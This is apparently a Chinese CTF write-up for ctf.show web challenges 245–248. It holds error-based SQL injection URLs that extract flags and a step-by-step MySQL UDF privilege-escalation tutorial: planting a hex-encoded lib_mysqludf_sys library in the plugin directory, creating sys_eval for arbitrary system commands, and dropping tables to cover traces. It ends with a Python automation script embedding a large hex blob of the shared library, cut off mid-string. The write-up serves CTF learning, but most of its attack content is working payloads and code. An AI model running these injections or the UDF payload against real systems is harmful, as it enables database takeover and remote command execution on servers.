<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0fbee15d-4936-43e7-a8f1-3f8e0f8e84c5.challenge.ctf.show:8080&#x2F;api&#x2F;?id&#x3D;1&#39; or extractvalue(1,concat(0x3d,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;ctfshow_flagsa&#39;)))#</span><br></pre></td></tr></table></figure></div>

<p><strong>拿flag</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">前部分</span><br><span class="line">ctfshow&#123;b2cc23cb-316b-4cea-b9ea</span><br><span class="line">语句</span><br><span class="line">http:&#x2F;&#x2F;0fbee15d-4936-43e7-a8f1-3f8e0f8e84c5.challenge.ctf.show:8080&#x2F;api&#x2F;?id&#x3D;1&#39; or extractvalue(1,concat(0x3d,(select group_concat(flag1) from ctfshow_flagsa)))%23</span><br><span class="line">后部分</span><br><span class="line">a-b9ea-9807145c946a&#125;</span><br><span class="line">语句</span><br><span class="line">http:&#x2F;&#x2F;0fbee15d-4936-43e7-a8f1-3f8e0f8e84c5.challenge.ctf.show:8080&#x2F;api&#x2F;?id&#x3D;1&#39; or extractvalue(1,concat(0x3d,(select right(group_concat(flag1),20) from ctfshow_flagsa)))%23</span><br><span class="line">重复部分删除</span><br><span class="line">ctfshow&#123;b2cc23cb-316b-4cea-b9ea-9807145c946a&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="web246"><a href="#web246" class="headerlink" title="web246"></a>web246</h2><blockquote>
<ul>
<li>过滤多加了个extractvalue，换一个方法，用group by报错方法，不过group by报错方法有and联合，还有union联合两种方法，都展示一下</li>
</ul>
</blockquote>
<p><strong>查字段</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">http://b8b5d561-57a2-477f-9c61-17caf1ce6094.challenge.ctf.show:<span class="number">8080</span>/api/?<span class="keyword">id</span>=<span class="number">1</span><span class="string">' and (select count(*) from information_schema.tables group by concat((select column_name from information_schema.columns where table_schema=database() and table_name='</span>ctfshow_flags<span class="string">' limit 1,1),floor(rand(0)*2))) %23</span></span><br></pre></td></tr></table></figure></div>

<p><strong>flag，没有长度限制</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;b8b5d561-57a2-477f-9c61-17caf1ce6094.challenge.ctf.show:8080&#x2F;api&#x2F;?id&#x3D;1&#39; and (select count(*) from information_schema.tables group by concat((select flag2 from ctfshow_flags limit 0,1),floor(rand(0)*2))) %23</span><br></pre></td></tr></table></figure></div>

<p>union报错查询查flag</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;b8b5d561-57a2-477f-9c61-17caf1ce6094.challenge.ctf.show:8080&#x2F;api&#x2F;?id&#x3D;1&#39; union select 1,count(*),concat((select flag2 from ctfshow_flags),floor(rand(0)*2)) a from information_schema.tables group by a %23</span><br></pre></td></tr></table></figure></div>

<h2 id="web247"><a href="#web247" class="headerlink" title="web247"></a>web247</h2><blockquote>
<ul>
<li>过滤了向下取整floor，没过滤ceil向上取整</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;b89fec88-85a4-4e59-b9b2-d6c71204e161.challenge.ctf.show:8080&#x2F;api&#x2F;?id&#x3D;1&#39; and (select count(*) from information_schema.tables group by concat((select &#96;flag?&#96; from ctfshow_flagsa),ceil(rand(0)*2))) %23</span><br></pre></td></tr></table></figure></div>

<h2 id="web248"><a href="#web248" class="headerlink" title="web248"></a>web248</h2><blockquote>
<ul>
<li>考点udf注入</li>
</ul>
</blockquote>
<h3 id="一、什么是udf"><a href="#一、什么是udf" class="headerlink" title="一、什么是udf"></a>一、什么是udf</h3><p> udf 全称为：user defined function，意为用户自定义函数；用户可以添加自定义的新函数到Mysql中，以达到功能的扩充，调用方式与一般系统自带的函数相同，例如 contact()，user()，version()等函数。</p>
<p> udf 文件后缀一般为 dll，由C、C++编写</p>
<h3 id="二、udf在渗透中的作用"><a href="#二、udf在渗透中的作用" class="headerlink" title="二、udf在渗透中的作用"></a>二、udf在渗透中的作用</h3><p> 在一般渗透过程中，拿下一台windows服务器的webshell时，由于webshell权限较低，有些操作无法进行，而此时本地恰好存在mysql数据库，那么udf可能就派上用场了；由于windows安装的mysql进程一般都拥有管理员权限，这就意味着用户自定义的函数也拥有管理员权限，我们也就拥有了执行管理员命令的权限，这时新建管理员用户等操作也就轻而易举了，大多数人称为这一操作为udf提权，其实表达不够准确，应该称为通过mysql获得管理员权限。</p>
<h3 id="三、利用条件"><a href="#三、利用条件" class="headerlink" title="三、利用条件"></a>三、利用条件</h3><p>利用udf的条件其实还是挺苛刻的</p>
<p><strong>mysql用户权限问题</strong></p>
<ul>
<li><p>获得一个数据库账号，拥有对MySQL的insert和delete权限。以root为佳。</p>
</li>
<li><p>拥有将udf.dll写入相应目录的权限。</p>
</li>
</ul>
<h3 id="四、数据库版本问题"><a href="#四、数据库版本问题" class="headerlink" title="四、数据库版本问题"></a>四、数据库版本问题</h3><p>udf利用的其中一步，是要将我们的xxx.dll文件上传到mysql检索目录中，mysql各版本的检索目录有所不同：</p>
<table>
<thead>
<tr>
<th>版本</th>
<th>路径</th>
</tr>
</thead>
<tbody><tr>
<td>MySQL &lt; 5.0</td>
<td>导出路径随意；</td>
</tr>
<tr>
<td>5.0 &lt;= MySQL&lt; 5.1</td>
<td>需要导出至目标服务器的系统目录（如：c:/windows/system32/）</td>
</tr>
<tr>
<td>5.1 &lt; MySQL</td>
<td>必须导出到MySQL安装目录下的lib\plugin文件夹下</td>
</tr>
</tbody></table>
<p><strong>一般Lib、Plugin文件夹需要手工建立（可用NTFS ADS流模式突破进而创建文件夹）</strong></p>
<h3 id="五、本地利用过程"><a href="#五、本地利用过程" class="headerlink" title="五、本地利用过程"></a>五、本地利用过程</h3><p><strong>1、获取Mysql安装路径</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">select @basedir</span><br></pre></td></tr></table></figure></div>

<p><strong>2、查看可操作路径</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">show global variables like &quot;%secure%&quot;</span><br></pre></td></tr></table></figure></div>

<p><strong>secure_file_priv值为null，表示mysql不允许导入导出，此时我们只能通过别的方法将udf.dll写入安装路径</strong></p>
<p><strong>3、查看plugin目录路径</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">select @@plugin_dir</span><br></pre></td></tr></table></figure></div>

<p><strong>4、将dll上传方式推荐几种</strong></p>
<p>将dll上传到安装路径的方式：</p>
<p>通过webshell上传</p>
<p>以hex方式直接上传</p>
<p><strong>sqlmap中现有的udf文件，分为32位和64位，一定要选择对版本，获取sqlmap的udf方式</strong></p>
<p><strong>5、sqlmap中udf获取方式</strong></p>
<p>自动化注入工具Sqlmap已经集成了此功能。</p>
<p><strong>在 \sqlmap\data\udf\mysql\windows\64目录下存放着lib_mysqludf_sys.dll_</strong></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210802180556258.png" alt="image-20210802180556258"></p>
<blockquote>
<ul>
<li><strong>但是sqlmap中自带的shell以及一些二进制文件，为了防止误杀都经过异或编码，不能直接使用</strong></li>
</ul>
</blockquote>
<p><strong>可以利用sqlmap 自带的解码工具cloak.py，在sqlmap\extra\cloak中打开命令行，来对lib_mysqludf_sys.dll_进行解码在，然后在直接利用，输入下面的</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">cloak.py -d -i C:\sqlmap\data\udf\mysql\windows\64\lib_mysqludf_sys.dll_</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210802180926662.png" alt="image-20210802180926662"></p>
<p>接着就会在\sqlmap\data\udf\mysql\windows\64目录下生成一个dll的文件<strong>lib_mysqludf_sys.dll</strong>，这个我们就可以直接拿来利用</p>
<p>攻击者可以利用lib_mysqludf_sys提供的函数执行系统命令。</p>
<p>函数：</p>
<p><strong>sys_eval，执行任意命令，并将输出返回。</strong></p>
<p><strong>sys_exec，执行任意命令，并将退出码返回。</strong></p>
<p><strong>sys_get，获取一个环境变量。</strong></p>
<p><strong>sys_set，创建或修改一个环境变量。</strong></p>
<p>以我windows系统为例，mysql版本为<strong>MySQL5.7.26</strong></p>
<p><strong>注意：攻击过程中，首先需要将lib_mysqludf_sys ( 目标为windows时，lib_mysqludf_sys.dll；linux时，lib_mysqludf_sys.so）上传到数据库能访问的路径下。</strong></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210802181450673.png" alt="image-20210802181450673"></p>
<blockquote>
<ul>
<li><strong>直接将刚刚生成的64位windows的dll文件复制到<code>D:\phpstudy8\Extensions\MySQL5.7.26\lib\plugin</code>中，然后再mysql中执行以下语句</strong></li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">function</span> sys_eval <span class="keyword">returns</span> <span class="keyword">string</span> <span class="keyword">soname</span> <span class="string">'udf.dll'</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210802181552843.png" alt="image-20210802181552843"></p>
<blockquote>
<ul>
<li><p>然后就可以任意命令执行了</p>
</li>
<li><p><strong>sys_eval，执行任意命令，并将输出返回。</strong></p>
<p><strong>sys_exec，执行任意命令，并将退出码返回。</strong></p>
<p><strong>sys_get，获取一个环境变量。</strong></p>
<p><strong>sys_set，创建或修改一个环境变量。</strong></p>
</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">select sys_eval(&#39;ipconfig&#39;)</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210802181722479.png" alt="image-20210802181722479"></p>
<h3 id="六、实战情况之一，hex编-解传入mysql系统提权"><a href="#六、实战情况之一，hex编-解传入mysql系统提权" class="headerlink" title="六、实战情况之一，hex编/解传入mysql系统提权"></a><strong>六、实战情况之一，hex编/解传入mysql系统提权</strong></h3><blockquote>
<ul>
<li><strong>本地利用的情况，你得已经上传webshell的情况下才能成功。如果你在sql实战中遇到可以使用outfile等上传文件的情况下，如何利用来系统权限命令执行。下面我们先熟悉一下本地测试一下具体情况</strong></li>
</ul>
</blockquote>
<p><strong>为了将这个转换为十六进制，可以借助mysql中的hex函数，先将udf.dll移动到C盘中，这样路径也清晰一些，然后执行下面命令</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">hex</span>(<span class="keyword">load_file</span>(<span class="string">'C:/udf.dll'</span>)) <span class="keyword">into</span> <span class="keyword">dumpfile</span> <span class="string">'c:/udf.txt'</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210802184049609.png" alt="image-20210802184049609"></p>
<p>成功生成了十六进制形式流</p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210802184106028.png" alt="image-20210802184106028"></p>
<p><strong>接下来就是把本地的udf16进制形式通过我们已经获得的webshell传到目标主机上。</strong></p>
<p><strong>一、新建一个表，名为udftmp，用于存放本地传来的udf文件的内容。</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> udftmp (c <span class="built_in">BLOB</span>)</span><br></pre></td></tr></table></figure></div>

<p><strong>二、在udftmp中写入udf文件内容</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> udftmp <span class="keyword">values</span>(<span class="keyword">unhex</span>(<span class="string">'udf文件的16进制格式'</span>))</span><br></pre></td></tr></table></figure></div>

<p><strong>三、将udf文件内容传入新建的udf文件中，路径根据自己的@@plugin_dir修改 //对于mysql小于5.1的，导出目录为</strong>C:\Windows\或C:\Windows\System32\</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> c <span class="keyword">from</span> udftmp <span class="keyword">into</span> <span class="keyword">dumpfile</span> <span class="string">'D:/phpstudy8/Extensions/MySQL5.7.26/lib/plugin/udf.dll'</span></span><br></pre></td></tr></table></figure></div>

<p><strong>四、执行下面语句，就可以system权限下命令任意执行，这电脑就沦陷了，执行命令上面已经说过，就不复述了</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">function</span> sys_eval <span class="keyword">returns</span> <span class="keyword">string</span> <span class="keyword">soname</span> <span class="string">'udf.dll'</span></span><br></pre></td></tr></table></figure></div>

<p><strong>五、删除痕迹，做好事不留名</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> udftmp</span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> sys_eval(<span class="string">'ipconfig'</span>);</span><br><span class="line">返回网卡信息</span><br></pre></td></tr></table></figure></div>

<p>本地实践了之后，基础知识差不多了解我们做一个实战靶场</p>
<p><strong>题目代码</strong></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210802215056685.png" alt="image-20210802215056685"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">$sql = "<span class="keyword">select</span> <span class="keyword">id</span>,username,pass <span class="keyword">from</span> ctfshow_user <span class="keyword">where</span> <span class="keyword">id</span> = <span class="string">'".$id."'</span> <span class="keyword">limit</span> <span class="number">1</span>;";</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li>测试了一下，明显存在堆叠注入，刚好可以利用堆叠注入，来进行udf来进行命令执行，<strong>测试，过滤information、and、or等各种语句无法布尔盲注、时间盲注、报错注入等</strong></li>
</ul>
</blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210802215137822.png" alt="image-20210802215137822"> </p>
<p><strong>好了，废话不多说直接看一下@@plugin_dir的路径来命令执行</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210802215552429.png" alt="image-20210802215552429"></p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">目录&#x2F;usr&#x2F;lib&#x2F;mariadb&#x2F;plugin&#x2F;</span><br></pre></td></tr></table></figure></div>

<p>对方是linux,当然写 一个脚本跑会快一些，我先手工实操一遍，之后就用脚本梭哈，首先根据我之前的方法生成64位linux的udf.so的十六进制形式</p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210803101639156.png" alt="image-20210803101639156"></p>
<p>由于这是get传参，是有长度限制的，16081的超过限制，会直接被ban了，所以我分按6000长度分为了三个文本文件里面装了udf十六进制三个部分</p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210803101807533.png" alt="image-20210803101807533"></p>
<p>接着我们将a、b、c三个中里面的十六进制导入到被攻击的机器中</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">'a部分十六进制'</span> <span class="keyword">into</span> <span class="keyword">dumpfile</span> <span class="string">'/usr/lib/mariadb/plugin/a.txt'</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210803102052966.png" alt="image-20210803102052966"></p>
<p><strong>为了确认我们是否已经导入load_file来判断</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="string">'/usr/lib/mariadb/plugin/a.txt'</span>)</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210803102140360.png" alt="image-20210803102140360"></p>
<p><strong>明显导入成功，照葫芦画瓢，将剩下的b和c导入进去</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210803102422360.png" alt="image-20210803102422360"></p>
</blockquote>
<p>当明显确定已经都导入成功了a、b、c三部分udf十六进制内容，接着来就是导入so到这个目录就可以命令执行</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">select unhex(concat(load_file(&#39;&#x2F;usr&#x2F;lib&#x2F;mariadb&#x2F;plugin&#x2F;a.txt&#39;),load_file(&#39;&#x2F;usr&#x2F;lib&#x2F;mariadb&#x2F;plugin&#x2F;b.txt&#39;),load_file(&#39;&#x2F;usr&#x2F;lib&#x2F;mariadb&#x2F;plugin&#x2F;c.txt&#39;),load_file(&#39;&#x2F;usr&#x2F;lib&#x2F;mariadb&#x2F;plugin&#x2F;d.txt&#39;))) into dumpfile &#39;&#x2F;usr&#x2F;lib&#x2F;mariadb&#x2F;plugin&#x2F;udf.so&#39;</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210803102536467.png" alt="image-20210803102536467"></p>
<p><strong>最后我们创建sys_eval这个函数来进行命令执行</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">create function sys_eval returns string soname &#39;udf.so&#39;</span><br></pre></td></tr></table></figure></div>

<p><strong>明显获得了命令执行的权限</strong></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210803102656908.png" alt="image-20210803102656908"></p>
<p><strong>我们可以看看ip配置</strong></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210803102747630.png" alt="image-20210803102747630"></p>
<p><strong>接着就拿这题的flag</strong></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210803103022002.png" alt="image-20210803103022002"></p>
<p><strong>但是这样就有点慢了，我写个脚本。很快的，大家可以参考一下</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">"http://419e5714-21cb-4a29-82d4-cecf0bb82bf7.challenge.ctf.show:8080/api/"</span></span><br><span class="line">payload = <span class="string">"?id=1';select '&#123;&#125;' into dumpfile '/usr/lib/mariadb/plugin/&#123;&#125;.txt'--+"</span></span><br><span class="line">acquire = <span class="string">"?id=1';select load_file('/usr/lib/mariadb/plugin/&#123;&#125;.txt')--+"</span></span><br><span class="line">text = [<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>]</span><br><span class="line"></span><br><span class="line">udf=<span class="string">"7F454C4602010100000000000000000003003E0001000000D00C0000000000004000000000000000E8180000000000000000000040003800050040001A00190001000000050000000000000000000000000000000000000000000000000000001415000000000000141500000000000000002000000000000100000006000000181500000000000018152000000000001815200000000000700200000000000080020000000000000000200000000000020000000600000040150000000000004015200000000000401520000000000090010000000000009001000000000000080000000000000050E57464040000006412000000000000641200000000000064120000000000009C000000000000009C00000000000000040000000000000051E5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000250000002B0000001500000005000000280000001E000000000000000000000006000000000000000C00000000000000070000002A00000009000000210000000000000000000000270000000B0000002200000018000000240000000E00000000000000040000001D0000001600000000000000130000000000000000000000120000002300000010000000250000001A0000000F000000000000000000000000000000000000001B00000000000000030000000000000000000000000000000000000000000000000000002900000014000000000000001900000020000000000000000A00000011000000000000000000000000000000000000000D0000002600000017000000000000000800000000000000000000000000000000000000000000001F0000001C0000000000000000000000000000000000000000000000020000000000000011000000140000000200000007000000800803499119C4C93DA4400398046883140000001600000017000000190000001B0000001D0000002000000022000000000000002300000000000000240000002500000027000000290000002A00000000000000CE2CC0BA673C7690EBD3EF0E78722788B98DF10ED871581CC1E2F7DEA868BE12BBE3927C7E8B92CD1E7066A9C3F9BFBA745BB073371974EC4345D5ECC5A62C1CC3138AFF36AC68AE3B9FD4A0AC73D1C525681B320B5911FEAB5FBE120000000000000000000000000000000000000000000000000000000003000900A00B0000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000E0000000120000000000000000000000DE01000000000000790100001200000000000000000000007700000000000000BA0000001200000000000000000000003504000000000000F5000000120000000000000000000000C2010000000000009E010000120000000000000000000000D900000000000000FB000000120000000000000000000000050000000000000016000000220000000000000000000000FE00000000000000CF000000120000000000000000000000AD00000000000000880100001200000000000000000000008000000000000000AB010000120000000000000000000000250100000000000010010000120000000000000000000000DC00000000000000C7000000120000000000000000000000C200000000000000B5000000120000000000000000000000CC02000000000000ED000000120000000000000000000000E802000000000000E70000001200000000000000000000009B00000000000000C200000012000000000000000000000028000000000000008001000012000B007A100000000000006E000000000000007500000012000B00A70D00000000000001000000000000001000000012000C00781100000000000000000000000000003F01000012000B001A100000000000002D000000000000001F01000012000900A00B0000000000000000000000000000C30100001000F1FF881720000000000000000000000000009600000012000B00AB0D00000000000001000000000000007001000012000B0066100000000000001400000000000000CF0100001000F1FF981720000000000000000000000000005600000012000B00A50D00000000000001000000000000000201000012000B002E0F0000000000002900000000000000A301000012000B00F71000000000000041000000000000003900000012000B00A40D00000000000001000000000000003201000012000B00EA0F0000000000003000000000000000BC0100001000F1FF881720000000000000000000000000006500000012000B00A60D00000000000001000000000000002501000012000B00800F0000000000006A000000000000008500000012000B00A80D00000000000003000000000000001701000012000B00570F00000000000029000000000000005501000012000B0047100000000000001F00000000000000A900000012000B00AC0D0000000000009A000000000000008F01000012000B00E8100000000000000F00000000000000D700000012000B00460E000000000000E800000000000000005F5F676D6F6E5F73746172745F5F005F66696E69005F5F6378615F66696E616C697A65005F4A765F5265676973746572436C6173736573006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974007379735F6765745F6465696E6974007379735F657865635F6465696E6974007379735F6576616C5F6465696E6974007379735F62696E6576616C5F696E6974007379735F62696E6576616C5F6465696E6974007379735F62696E6576616C00666F726B00737973636F6E66006D6D6170007374726E6370790077616974706964007379735F6576616C006D616C6C6F6300706F70656E007265616C6C6F630066676574730070636C6F7365007379735F6576616C5F696E697400737472637079007379735F657865635F696E6974007379735F7365745F696E6974007379735F6765745F696E6974006C69625F6D7973716C7564665F7379735F696E666F006C69625F6D7973716C7564665F7379735F696E666F5F696E6974007379735F657865630073797374656D007379735F73657400736574656E76007379735F7365745F6465696E69740066726565007379735F67657400676574656E76006C6962632E736F2E36005F6564617461005F5F6273735F7374617274005F656E6400474C4942435F322E322E35000000000000000000020002000200020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001000100000001000100B20100001000000000000000751A690900000200D401000000000000801720000000000008000000000000008017200000000000D01620000000000006000000020000000000000000000000D81620000000000006000000030000000000000000000000E016200000000000060000000A00000000000000000000000017200000000000070000000400000000000000000000000817200000000000070000000500000000000000000000001017200000000000070000000600000000000000000000001817200000000000070000000700000000000000000000002017200000000000070000000800000000000000000000002817200000000000070000000900000000000000000000003017200000000000070000000A00000000000000000000003817200000000000070000000B00000000000000000000004017200000000000070000000C00000000000000000000004817200000000000070000000D00000000000000000000005017200000000000070000000E00000000000000000000005817200000000000070000000F00000000000000000000006017200000000000070000001000000000000000000000006817200000000000070000001100000000000000000000007017200000000000070000001200000000000000000000007817200000000000070000001300000000000000000000004883EC08E827010000E8C2010000E88D0500004883C408C3FF35320B2000FF25340B20000F1F4000FF25320B20006800000000E9E0FFFFFFFF252A0B20006801000000E9D0FFFFFFFF25220B20006802000000E9C0FFFFFFFF251A0B20006803000000E9B0FFFFFFFF25120B20006804000000E9A0FFFFFFFF250A0B20006805000000E990FFFFFFFF25020B20006806000000E980FFFFFFFF25FA0A20006807000000E970FFFFFFFF25F20A20006808000000E960FFFFFFFF25EA0A20006809000000E950FFFFFFFF25E20A2000680A000000E940FFFFFFFF25DA0A2000680B000000E930FFFFFFFF25D20A2000680C000000E920FFFFFFFF25CA0A2000680D000000E910FFFFFFFF25C20A2000680E000000E900FFFFFFFF25BA0A2000680F000000E9F0FEFFFF00000000000000004883EC08488B05F50920004885C07402FFD04883C408C390909090909090909055803D900A2000004889E5415453756248833DD809200000740C488B3D6F0A2000E812FFFFFF488D05130820004C8D2504082000488B15650A20004C29E048C1F803488D58FF4839DA73200F1F440000488D4201488905450A200041FF14C4488B153A0A20004839DA72E5C605260A2000015B415CC9C3660F1F8400000000005548833DBF072000004889E57422488B05530920004885C07416488D3DA70720004989C3C941FFE30F1F840000000000C9C39090C3C3C3C331C0C3C341544883C9FF4989F455534883EC10488B4610488B3831C0F2AE48F7D1488D69FFE8B6FEFFFF83F80089C77C61754FBF1E000000E803FEFFFF488D70FF4531C94531C031FFB921000000BA07000000488D042E48F7D64821C6E8AEFEFFFF4883F8FF4889C37427498B4424104889EA4889DF488B30E852FEFFFFFFD3EB0CBA0100000031F6E802FEFFFF31C0EB05B8010000005A595B5D415CC34157BF00040000415641554531ED415455534889F34883EC1848894C24104C89442408E85AFDFFFFBF010000004989C6E84DFDFFFFC600004889C5488B4310488D356A030000488B38E814FEFFFF4989C7EB374C89F731C04883C9FFF2AE4889EF48F7D1488D59FF4D8D641D004C89E6E8DDFDFFFF4A8D3C284889DA4C89F64D89E54889C5E8A8FDFFFF4C89FABE080000004C89F7E818FDFFFF4885C075B44C89FFE82BFDFFFF807D0000750A488B442408C60001EB1F42C6442DFF0031C04883C9FF4889EFF2AE488B44241048F7D148FFC94889084883C4184889E85B5D415C415D415E415FC34883EC08833E014889D7750B488B460831D2833800740E488D353A020000E817FDFFFFB20188D05EC34883EC08833E014889D7750B488B460831D2833800740E488D3511020000E8EEFCFFFFB20188D05FC3554889FD534889D34883EC08833E027409488D3519020000EB3F488B46088338007409488D3526020000EB2DC7400400000000488B4618488B384883C70248037808E801FCFFFF31D24885C0488945107511488D351F0200004889DFE887FCFFFFB20141585B88D05DC34883EC08833E014889F94889D77510488B46088338007507C6010131C0EB0E488D3576010000E853FCFFFFB0014159C34154488D35EF0100004989CC4889D7534889D34883EC08E832FCFFFF49C704241E0000004889D8415A5B415CC34883EC0831C0833E004889D7740E488D35D5010000E807FCFFFFB001415BC34883EC08488B4610488B38E862FBFFFF5A4898C34883EC28488B46184C8B4F104989F2488B08488B46104C89CF488B004D8D4409014889C6F3A44C89C7498B4218488B0041C6040100498B4210498B5218488B4008488B4A08BA010000004889C6F3A44C89C64C89CF498B4218488B400841C6040000E867FBFFFF4883C4284898C3488B7F104885FF7405E912FBFFFFC3554889CD534C89C34883EC08488B4610488B38E849FBFFFF4885C04889C27505C60301EB1531C